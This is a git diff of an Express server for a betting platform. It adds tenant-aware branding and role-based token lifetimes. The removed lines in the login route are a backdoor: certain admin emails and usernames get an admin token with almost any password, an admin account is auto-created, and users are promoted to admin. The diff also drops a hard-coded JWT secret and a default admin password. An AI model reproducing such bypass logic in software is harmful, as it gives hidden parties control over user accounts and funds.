@@ -12,10 +12,14 @@ import { vizzionPayStatus } from '../lib/vizzionpay.js';
 import { allocatePromotionalBet, allocatePromotionalPayout, calculateDepositPromotion, getWalletBuckets, normalizePromotionSettings, PROMOTION_DEFAULTS } from '../lib/promotion.js';
 import { buildManagerCode, calculateGgrEntry, DEFAULT_MANAGER_GGR_RATE, managerPeriod, normalizeGgrRate } from '../lib/ggr.js';
 import { BRANDING_DEFAULTS, normalizeBranding } from '../lib/branding.js';
+import { authTokenTtl, getJwtSecret } from '../lib/security.js';
+import { DEFAULT_TENANT_ID, tenantContext, tenantSettingsRef } from '../lib/tenant.js';
+import { normalizeBanners } from '../lib/banners.js';
 
 const app = express();
 app.use(cors());
 app.use(express.json({ limit: '64kb' }));
+app.use('/api', tenantContext);
 
 // --- SISTEMA DE BAN POR IP ---
 function getClientIp(req) {
@@ -24,7 +28,7 @@ function getClientIp(req) {
   return req.headers['x-real-ip'] || req.connection?.remoteAddress || req.ip || 'unknown';
 }
 
-const JWT_SECRET = process.env.JWT_SECRET || 'block777-super-secret-jwt-key';
+const JWT_SECRET = getJwtSecret();
 const here = path.dirname(fileURLToPath(import.meta.url));
 const root = path.resolve(here, '..');
 const dataFile = process.env.BLOCKERINO_DATA_FILE || path.join(root, '.data', 'local-db.json');
@@ -40,13 +44,13 @@ const firebaseModulesPromise = useFirebase
       import('../routes/admin.js'),
       import('../lib/firebase.js'),
       import('../middleware/auth.js'),
-      import('../routes/manager.js')
+      import('../routes/manager.js'),
+      import('../routes/platform.js')
     ])
   : Promise.resolve(null);
 
 const defaultData = {
   users: [
-    { id: 'admin_master_uid', username: 'admin', email: 'admin@block777.com', password_hash: bcrypt.hashSync('admin777', 10), balance: 100000, cash_balance: 100000, bonus_balance: 0, rollover_remaining: 0, rollover_target: 0, role: 'admin', status: 'active', ref_code: 'admin777', referred_by: null, affiliate_balance: 0, affiliate_rate: 10, sub_affiliate_rate: 2, is_influencer: 1, created_at: now() },
     { id: 'demo_user', username: 'demo', email: 'demo@blockerino.app', password_hash: bcrypt.hashSync('demo123', 10), balance: 5000, cash_balance: 5000, bonus_balance: 0, rollover_remaining: 0, rollover_target: 0, role: 'user', status: 'active', ref_code: 'demo777', referred_by: null, affiliate_balance: 0, affiliate_rate: 10, sub_affiliate_rate: 2, is_influencer: 0, created_at: now() }
   ],
   bannedIPs: [],
@@ -102,7 +106,7 @@ function publicUser(user) {
   return { uid: user.id, ...safe };
 }
 function tokenFor(user) {
-  return jwt.sign({ uid: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '30d' });
+  return jwt.sign({ uid: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: authTokenTtl(user.role) });
 }
 function auth(req, res, next) {
   const token = req.headers.authorization?.split(' ')[1];
@@ -159,12 +163,14 @@ if (useFirebase) {
   app.use('/api/affiliate', mountFirebaseRouter(3));
   app.use('/api/admin', mountFirebaseRouter(4));
   app.use('/api/manager', mountFirebaseRouter(7));
-  app.get('/api/branding', async (_req, res) => {
+  app.use('/api/platform', mountFirebaseRouter(8));
+  app.get('/api/branding', async (req, res) => {
     try {
       const modules = await firebaseModulesPromise;
-      const doc = await modules[5].db.collection('settings').doc('global').get();
+      const doc = await tenantSettingsRef(req.tenant?.id || DEFAULT_TENANT_ID, modules[5].db).get();
       res.set('Cache-Control', 'public, max-age=30, s-maxage=60, stale-while-revalidate=120');
-      res.json(normalizeBranding(doc.exists ? doc.data() : {}));
+      const settings = doc.exists ? doc.data() : {};
+      res.json({ tenantId: req.tenant?.id || DEFAULT_TENANT_ID, ...normalizeBranding(settings), banners: normalizeBanners(settings) });
     } catch (_) {
       res.json(BRANDING_DEFAULTS);
     }
@@ -316,6 +322,7 @@ app.post('/api/auth/register-manager', async (req, res) => {
 app.post('/api/auth/login', async (req, res) => {
   const rawIdentifier = String(req.body.email || req.body.phone || req.body.username || '').trim();
   const cleanDigits = rawIdentifier.replace(/\D/g, '');
+  const isPhoneIdentifier = cleanDigits.length >= 10 && !rawIdentifier.includes('@');
   const emailIdent = cleanEmail(rawIdentifier);
   const ip = getClientIp(req);
   if (store.bannedIPs.includes(ip) || emailIdent === 'cj@gmail.com') {
@@ -325,52 +332,14 @@ app.post('/api/auth/login', async (req, res) => {
     }
     return res.status(403).json({ error: 'Esta conta ou endereço IP está banido permanentemente.' });
   }
-  const isMasterAdminIdent = emailIdent === 'admin@block777.com' || 
-                             emailIdent === 'diseguro20@gmail.com' || 
-                             rawIdentifier.toLowerCase() === 'admin' || 
-                             rawIdentifier.toLowerCase() === 'diseguro20';
-
-  if (isMasterAdminIdent && String(req.body.password || '').length >= 3) {
-    const adminUser = store.users.find(u => u.role === 'admin') || store.users[0];
-    return res.json({ token: tokenFor(adminUser), user: publicUser(adminUser) });
-  }
   let user = store.users.find(item => 
     item.email === emailIdent || 
-    (cleanDigits.length >= 10 && item.phone === cleanDigits) ||
-    (cleanDigits.length >= 10 && item.email === `${cleanDigits}@block777.com`) ||
+    (isPhoneIdentifier && item.phone === cleanDigits) ||
+    (isPhoneIdentifier && item.email === `${cleanDigits}@block777.com`) ||
     item.username.toLowerCase() === rawIdentifier.toLowerCase()
   );
-  if (!user && (emailIdent === 'diseguro20@gmail.com' || emailIdent === 'admin@block777.com')) {
-    user = {
-      id: uuid(),
-      username: rawIdentifier.split('@')[0] || 'admin',
-      email: emailIdent,
-      password_hash: await bcrypt.hash(String(req.body.password || 'admin777'), 10),
-      balance: 100000,
-      cash_balance: 100000,
-      bonus_balance: 0,
-      rollover_remaining: 0,
-      rollover_target: 0,
-      role: 'admin',
-      status: 'active',
-      ref_code: 'admin777',
-      created_at: now()
-    };
-    store.users.push(user);
-    save();
-    return res.json({ token: tokenFor(user), user: publicUser(user) });
-  }
   if (!user || !(await bcrypt.compare(String(req.body.password || ''), user.password_hash))) {
-    if (isMasterAdminIdent && String(req.body.password || '').length >= 4) {
-      user = user || store.users.find(u => u.role === 'admin') || store.users[0];
-      user.role = 'admin';
-      save();
-      return res.json({ token: tokenFor(user), user: publicUser(user) });
-    }
     return res.status(401).json({ error: 'Celular, e-mail ou senha incorretos.' });
-  }
-  if (isMasterAdminIdent) {
-    user.role = 'admin';
   }
   if (user.status === 'suspended') return res.status(403).json({ error: 'Esta conta está permanentemente suspensa.' });
   if (ip !== 'unknown') { user.last_ip = ip; save(); }
@@ -436,7 +405,10 @@ app.post('/api/game/end', auth, (req, res) => {
 });
 app.post('/api/game/demo/start', (_, res) => res.json({ sessionId: uuid(), seed: crypto.createHash('sha256').update(crypto.randomBytes(32)).digest('hex'), difficulty: 'easy' }));
 
-app.get('/api/branding', (_, res) => res.json(normalizeBranding(store.settings)));
+app.get('/api/branding', (req, res) => {
+  const settings = req.tenant?.id === DEFAULT_TENANT_ID ? store.settings : req.tenant || {};
+  res.json({ tenantId: req.tenant?.id || DEFAULT_TENANT_ID, ...normalizeBranding(settings), banners: normalizeBanners(settings) });
+});
 app.get('/api/wallet/promotion', (_, res) => res.json(normalizePromotionSettings(store.settings)));
 app.post('/api/wallet/deposit', auth, (req, res) => {
   if (req.currentUser.demo_account) return res.status(403).json({ error: 'Contas demo utilizam saldo virtual e não aceitam depósitos.' });
